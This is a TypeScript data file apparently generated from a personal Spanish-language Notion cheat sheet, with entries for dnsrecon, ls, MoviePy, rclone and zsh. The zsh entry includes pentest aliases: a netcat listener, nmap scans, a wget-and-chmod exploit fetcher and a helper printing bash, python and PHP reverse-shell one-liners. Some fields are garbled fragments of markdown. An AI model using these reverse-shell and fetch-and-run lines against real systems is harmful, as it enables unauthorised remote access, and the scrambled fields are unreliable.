// Este archivo es generado automáticamente desde Notion
// NO editar manualmente - los cambios se sobrescribirán

export interface Command {
  id: string;
  title: string;
  command: string;
  description: string;
  category: string;
  tags: string[];
  examples?: string[];
  dangerous?: boolean;
  platform?: string;
  syntax?: string;
  parameters?: Array<{
    param: string;
    description: string;
    example: string;
  }>;
  output?: string;
  notes?: string;
  references?: string[];
  created_at: string;
  updated_at: string;
}

export const commands: Command[] = [
  {
    "id": "24fec7e7-4fc0-80ef-a008-f3585a1afc4e",
    "title": "Dnsrecon",
    "command": "dnsrecon -d ejemplo.com -t std",
    "description": "Herramienta para enumerar registros DNS y realizar descubrimiento de subdominios.",
    "category": "Escan",
    "tags": [],
    "examples": [
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon [opciones]",
      "dnsrecon -d ejemplo.com -t std",
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon -d ejemplo.com -t axfr"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
    "parameters": [
      {
        "param": "-d",
        "description": "Dominio objetivo",
        "example": "`-d ejemplo.com`"
      },
      {
        "param": "-t",
        "description": "Tipo de enumeración (`std`, `brt`, `axfr`, `goo`)",
        "example": "`-t brt`"
      },
      {
        "param": "-D",
        "description": "Diccionario de subdominios",
        "example": "`-D subdomains.txt`"
      },
      {
        "param": "--lifetime",
        "description": "Timeout de consulta",
        "example": "`--lifetime 5`"
      }
    ],
    "output": "",
    "notes": "- El tipo `std` obtiene registros básicos (A, AAAA, MX, NS, TXT).\n- Usar `t goo` para buscar subdominios indexados en Google.\n- Con diccionarios grandes, limitar el tiempo de consulta con `-lifetime`.",
    "references": [
      "Repositorio oficial",
      "Documentación"
    ],
    "created_at": "2025-08-14T20:53:00.000Z",
    "updated_at": "2025-12-28T22:13:00.000Z"
  },
  {
    "id": "253ec7e7-4fc0-80e2-bdb9-e54621c69807",
    "title": "Ls ",
    "command": "ls -la /home/usuario/documentos",
    "description": " listar archivos y directorios",
    "category": "Linux",
    "tags": [],
    "examples": [
      "ls -la /home/usuario/documentos"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "ls -la /home/usuario/documentos",
    "parameters": [],
    "output": "",
    "notes": "",
    "references": [
      "Manual de ls",
      "Guía de comandos Linux"
    ],
    "created_at": "2025-08-18T01:16:00.000Z",
    "updated_at": "2025-08-18T01:52:00.000Z"
  },
  {
    "id": "252ec7e7-4fc0-8011-b047-f847e6967442",
    "title": "movipy",
    "command": "python Generador_video.py",
    "description": "Genera videos a partir de imagenes ",
    "category": "Python",
    "tags": [],
    "examples": [
      "# Verificar versión actual\npython --version",
      "deactivate",
      "### 3. Crear Nuevo Entorno Virtual",
      "### 4. Activar Entorno Virtual",
      "> ✅ Verificación: Tu prompt debe cambiar a (env) PS X:\\....\n\n---\n\n\n## 📦 Instalación de Dependencias\n\n\n### 1. Actualizar Herramientas Base",
      "### 2. Instalar MoviePy y Dependencias\n\n\n### Comando Recomendado",
      "### Si hay errores SSL (solo desarrollo local)",
      "### 3. Verificar Instalación",
      "**Resultado esperado:** `✔ MoviePy funcionando correctamente`\n\n\n---\n\n\n## 📁 Estructura del Proyecto\n\n\n### Organización Recomendada",
      "---\n\n\n## 💻 Código Base\n\n\n### Script Principal (Generador_video.py)",
      "---\n\n\n## 🚀 Ejecución\n\n\n### Ejecutar el Script",
      "---\n\n\n## 🔧 Solución de Problemas\n\n\n### ❌ Error: `No module named 'moviepy.editor'`\n\n- **Causa:** MoviePy 2.x cambió la estructura de módulos\n- **Solución:** Usar `\"moviepy<2\"` en la instalación\n\n### ❌ Error: `AttributeError: module 'PIL.Image' has no attribute 'ANTIALIAS'`\n\n- **Causa:** Pillow muy nuevo incompatible con MoviePy 1.x\n- **Solución:** Usar `pillow==9.5.0`\n\n### ❌ Error: `TypeError: unsupported operand type(s) for +: 'int' and 'NoneType'`\n\n- **Causa:** Clips con duración `None`\n- **Solución:** Filtrar clips antes de concatenar:",
      "### ❌ Error: `ssl.SSLCertVerificationError`\n\n- **Causa:** Problemas de certificados SSL\n- **Solución:** Usar `-trusted-host` en pip install\n\n### ❌ Error: Conflicto de nombres\n\n- **Causa:** Script nombrado `moviepy.py`\n- **Solución:** Renombrar a `Generador_video.py` o similar\n\n---\n\n\n## 📊 Versiones Compatibles\n\n\n| Librería           | Versión |\n| ------------------ | ------- |\n| **Python**         | 3.11.x  |\n| **MoviePy**        | < 2.0   |\n| **Pillow**         | 9.5.0   |\n| **NumPy**          | 1.24.3  |\n| **ImageIO**        | 2.31.1  |\n| **ImageIO-FFmpeg** | 0.4.8   |\n\n\n---\n\n\n## ✅ Comandos de Verificación\n\n\n### Verificar entorno activo",
      "### Verificar instalaciones",
      "### Prueba rápida"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Verificar versión actual\npython --version",
    "parameters": [],
    "output": "",
    "notes": "",
    "references": [
      "Descargar Python 3.11"
    ],
    "created_at": "2025-08-17T02:46:00.000Z",
    "updated_at": "2025-10-10T02:36:00.000Z"
  },
  {
    "id": "288ec7e7-4fc0-80b3-81ca-f99965597cc9",
    "title": "Rclone",
    "command": "rclone sync \"source\"   \"Destino\\\"   -P ",
    "description": "Como usar Rclone",
    "category": "Config",
    "tags": [],
    "examples": [
      "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
      "rclone [comando] [origen] [destino] [opciones]",
      "rclone sync ./MisFotos gdrive:/Fotos --progress --dry-run",
      "rclone mount gdrive:/ ~/GDrive",
      "rclone sync ./Documentos gdrive:/Backup/Documentos -P --delete-after",
      "rclone copy ./notas gdrive:/pdfs --include \"*.pdf\" -P",
      "rclone sync \"C:\\OBS\" \"P:\\OBS\" -P --exclude \"*.tmp\" --exclude \"*.bak\""
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
    "parameters": [
      {
        "param": "-listremotes",
        "description": "Lista las particones remotas",
        "example": "rclone listremotes"
      },
      {
        "param": "-config delete ''",
        "description": "Elimina el directorio deseado",
        "example": "|"
      },
      {
        "param": "--dry-run",
        "description": "Muestra un apreview sobre el comando a ejecutar.",
        "example": "rcloud   -comand —dry-run"
      },
      {
        "param": "--update",
        "description": "Actualiza solo lo mas reciente",
        "example": "rclone —command —update"
      }
    ],
    "output": "",
    "notes": "- Antes de sincronizar, **usa** **`--dry-run`** para evitar errores fatales.\n- **Programar backups automáticos** con `cron`\n- Rclone puede cifrar tus datos con `rclone config` → tipo `crypt7`",
    "references": [
      "Documentación"
    ],
    "created_at": "2025-10-10T01:31:00.000Z",
    "updated_at": "2025-10-12T23:27:00.000Z"
  },
  {
    "id": "2d7ec7e7-4fc0-8054-a7ea-de3d27892a26",
    "title": "zsh",
    "command": "sudo nano ~/.zshrc ",
    "description": "Cheas para configurar zshrc",
    "category": "zshrc",
    "tags": [],
    "examples": [
      "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
      "bat archivo.py        # Ver archivo con colores\nbat -l man archivo    # Aplicar formato de man\nalias bat='batcat'    # Ya está configurado en tu zshrc",
      "Ctrl+T                # Buscar archivos en directorio actual\nCtrl+R                # Buscar en historial\nAlt+C                 # Navegar directorios\n\n# Completar con FZF en cualquier comando (usa **)\ncd **<TAB>            # Buscar directorios para cd\nls **<TAB>            # Buscar archivos para listar\ncat **<TAB>           # Buscar archivo para ver contenido\ngrep patrón **<TAB>   # Buscar archivos para grep",
      "alias ls='lsd'        # ls con colores y iconos\nll                    # ls -l (detalles)\nla                    # ls -A (ocultos)\nl                     # ls -CF (compact)",
      "..                    # cd ..\n...                   # cd ../..\n....                  # cd ../../..\n.....                 # cd ../../../..",
      "alias history=\"history 0\"    # Ver todo el historial",
      "du                    # du -h (tamaño carpetas)\ndf                    # df -h (espacios montar)",
      "export EDITOR=nvim    # O vim/nano\nexport VISUAL=$EDITOR",
      "myip                  # Todas las IPs (local + VPN)\nmyip4                 # Solo IPv4 (sin loopback)\nmyip6                 # Solo IPv6\nvpnip                 # IP del tun0 (VPN)",
      "www                   # Python HTTP.server en puerto 80\nwww8                  # Python HTTP.server en puerto 8000\nphpserver             # PHP server en 0.0.0.0:8000",
      "ports                 # netstat -tulanp (puertos escuchando)\nlistening             # lsof -i -P (conexiones activas)\nportscan              # nmap -sS -sV -O",
      "sgrep \"pattern\"       # grep -R -n -H -C 5 (recursivo con contexto)",
      "cpv                   # rsync -ah --info=progress2 (Copia visible)",
      "extract archivo.tar.gz     # Extrae automáticamente (.tar.bz2, .zip, .rar, .7z, etc.)",
      "gs                    # git status\nga                    # git add\ngc \"mensaje\"          # git commit -m \"mensaje\"\ngp                    # git push\ngl                    # git log --oneline --graph --decorate",
      "mkcd nombre           # mkdir -p nombre && cd nombre",
      "kp nombre_proceso     # Mata proceso por nombre (sudo kill -9)",
      "hs \"búsqueda\"         # history | grep \"búsqueda\"",
      "cp_p archivo1 archivo2   # Copia visual con barra de progreso",
      "genpass               # 16 caracteres aleatorios (default)\ngenpass 32            # 32 caracteres aleatorios",
      "listports             # sudo netstat -tulanp | grep LISTEN",
      "ff \"nombre\"           # find . -type f -iname \"*nombre*\"\nfd \"nombre\"           # find . -type d -iname \"*nombre*\"",
      "bk archivo.txt        # archivo.txt.bak.YYYYMMDD_HHMMSS",
      "path                  # Muestra cada ruta en una línea",
      "transfer archivo      # Sube y devuelve URL pública temporal",
      "extract archivo       # Detecta formato y extrae (.tar, .zip, .7z, .rar, .gz, etc.)",
      "nmap-quick <target>   # nmap -sC -sV -oN quick.txt <target>\nnmap-full <target>    # nmap -p- -sC -sV -oN full.txt <target>\nnmap-udp <target>     # sudo nmap -sU -sC -sV -oN udp.txt <target>\nnmap-vuln <target>    # nmap --script vuln -oN vuln.txt <target>",
      "ctfscan 10.10.10.1    # nmap -sC -sV -oA nmap/10.10.10.1 10.10.10.1\n                      # Crea carpeta nmap/ y guarda 3 formatos (.nmap, .gnmap, .xml)",
      "listen                # nc -lvnp 443 (default)\nlisten 4444           # nc -lvnp 4444\n                      # Usa rlwrap para historial + edición",
      "nc 192.168.1.1 4444   # netcat directo (con rlwrap)\nalias nc='rlwrap nc'",
      "ttyup                 # Muestra guía paso a paso\n                      # 1. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n                      # 2. Ctrl+Z\n                      # 3. stty raw -echo; fg\n                      # 4. export TERM=xterm\n                      # 5. stty rows 38 columns 116",
      "echo \"texto\" | clip   # Copiar a clipboard\npaste                 # Pegar desde clipboard",
      "getexploit https://github.com/...script.py\n                      # wget URL -O nombre && chmod +x nombre",
      "update                # sudo apt update && full-upgrade -y && autoremove -y",
      "HISTFILE=~/.zsh_history    # 50,000 líneas guardadas\nHISTSIZE=50000\nSAVEHIST=50000\n\n# Opciones:\n# - hist_expire_dups_first: Borra duplicados primero\n# - hist_ignore_dups: No guarda comandos iguales consecutivos\n# - hist_ignore_space: Ignora comandos que comienzan con espacio\n# - extended_history: Guarda timestamp",
      "export MANPAGER=\"sh -c 'col -bx | bat -l man -p'\"    # man con colores\nexport FZF_DEFAULT_OPTS=\"--height 40% --layout=reverse --border\"\nexport TERM=xterm-256color\nexport EDITOR=nvim",
      "# zsh completion automático\n# zstyle options para colors, matcher-list, etc.",
      "Ctrl+Space  # Acepta sugerencia",
      "cd /path1      # pushd automático\ncd /path2\npopd           # Vuelve a /path1",
      "ls=lsd         # Expande a ls --color=auto\nnmap=nmap -sC -sV    # Expande automáticamente",
      "setopt correct        # ❌ Puede auto-corregir comandos peligrosos",
      "setopt noclobber      # ✅ Previene sobrescribir archivos con >\nsetopt rm_star_wait   # ✅ Espera 10 segundos antes de rm *\nsetopt hist_ignore_space   # ✅ Ignora comandos con espacio prefix",
      "Alternar con:",
      "---\n\n\n## 📝 Crear tus propios aliases/funciones\n\n\n### Alias simple",
      "### Función personalizada",
      "---\n\n\n## 🚀 Rápido - Comandos más usados"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
    "parameters": [
      {
        "param": "Ctrl+A",
        "description": "Inicio de línea",
        "example": "| `Ctrl+E`"
      },
      {
        "param": "Ctrl+<-",
        "description": "Palabra anterior",
        "example": "| `Ctrl+->`"
      },
      {
        "param": "Ctrl+U",
        "description": "Borrar línea (backward-kill-line)",
        "example": "| `Ctrl+Supr`"
      },
      {
        "param": "Delete",
        "description": "Borrar carácter",
        "example": "### Historial"
      },
      {
        "param": "↑",
        "description": "Comando anterior (busca en historial)",
        "example": "| `↓`"
      },
      {
        "param": "Ctrl+R",
        "description": "Búsqueda incremental en historial",
        "example": "| `Ctrl+S`"
      },
      {
        "param": "Shift+Tab",
        "description": "Deshacer última acción (undo)",
        "example": "| `Ctrl+P`"
      },
      {
        "param": "Ctrl+Space",
        "description": "Aceptar autosuggestion",
        "example": "### FZF"
      },
      {
        "param": "Ctrl+T",
        "description": "Buscar archivo",
        "example": "| `Ctrl+R`"
      },
      {
        "param": "Alt+C",
        "description": "Navegar directorios",
        "example": "| `Tab`"
      }
    ],
    "output": "revshell              # Detecta IP de tun0 y puerto 443 (default)\nrevshell 192.168.1.1  # IP custom, puerto 443\nrevshell 192.168.1.1 4444   # IP y puerto custom\n\n# Output: 3 opciones (bash, python3, php)\n# bash -i >& /dev/tcp/IP/PORT 0>&1\n# python3 -c 'import socket,subprocess,os;s=...'\n# php -r '$sock=fsockopen(\"IP\",PORT);...'",
    "notes": "",
    "references": [],
    "created_at": "2025-12-28T04:22:00.000Z",
    "updated_at": "2025-12-28T23:44:00.000Z"
  }
];

// Convertir categorías de strings a objetos para compatibilidad con componentes
export const categories = [
  { id: 'all', name: 'Todos los comandos', color: 'gray', count: commands.length },
  ...([...new Set(commands.map(cmd => cmd.category))].sort().map(category => ({
    id: category.toLowerCase().replace(/\s+/g, '-'),
    name: category,
    color: getCategoryColor(category),
    count: commands.filter(cmd => cmd.category === category).length
  })))
];

// Función para asignar colores a categorías
function getCategoryColor(category: string): string {
  const colorMap: { [key: string]: string } = {
    'dns': 'blue',
    'linux': 'green',
    'security': 'red',
    'network': 'indigo',
    'database': 'purple',
    'web': 'orange',
    'git': 'teal',
    'docker': 'cyan'
  };
  
  return colorMap[category.toLowerCase()] || 'gray';
}

export function getCommandById(id: string): Command | undefined {
  return commands.find(cmd => cmd.id === id);
}

export function getCommandsByCategory(category: string): Command[] {
  if (category === 'all') return commands;
  return commands.filter(cmd => cmd.category === category);
}

export function searchCommands(query: string): Command[] {
  const searchTerm = query.toLowerCase();
  return commands.filter(cmd => 
    cmd.title.toLowerCase().includes(searchTerm) ||
    cmd.command.toLowerCase().includes(searchTerm) ||
    cmd.description.toLowerCase().includes(searchTerm) ||
    cmd.tags.some(tag => tag.toLowerCase().includes(searchTerm))
  );
}
